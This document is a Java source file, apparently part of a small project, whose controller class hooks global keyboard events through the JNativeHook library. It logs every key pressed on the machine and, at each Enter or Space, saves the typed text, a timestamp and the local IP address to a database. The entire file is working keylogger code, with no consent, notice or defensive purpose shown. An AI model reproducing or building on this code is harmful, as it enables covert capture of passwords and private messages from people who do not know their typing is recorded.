package controller;

import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;
import model.Registrador;
import model.DAO;

/**
 * Classe para controle e registro das teclas digitadas
 * @author Mauricio
 */
public class RegistradorController implements NativeKeyListener {
    Registrador registrador;
    static ArrayList<Registrador> lista = new ArrayList();

    public static ArrayList getTeclas() {
        return RegistradorController.lista;
    }

    String teclaCapturada = "";

    DAO dao = new DAO();

    /**
     * @param e pegar a tecla pressionada pelo usuário
     */
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        String tecla = NativeKeyEvent.getKeyText(e.getKeyCode());
        String ip = "";
        
        if (tecla.length() > 1) {
            teclaCapturada += "[" + tecla + "]";
        } else {
            teclaCapturada += tecla;
        }

        if (tecla.equals("Enter") || tecla.equals("Espaço")) {
            try {
                ip = InetAddress.getLocalHost().getHostAddress();
            } catch (UnknownHostException ex) {
                Logger.getLogger(RegistradorController.class.getName()).log(Level.SEVERE, null, ex);
            }
            registrador = new Registrador(new SimpleDateFormat("dd/MM/yyyy - HH:mm:ss").format(java.sql.Timestamp.from(java.time.Instant.now())), ip, teclaCapturada);
            dao.inserirRegistros(registrador);
            teclaCapturada = "";
        }
    }
}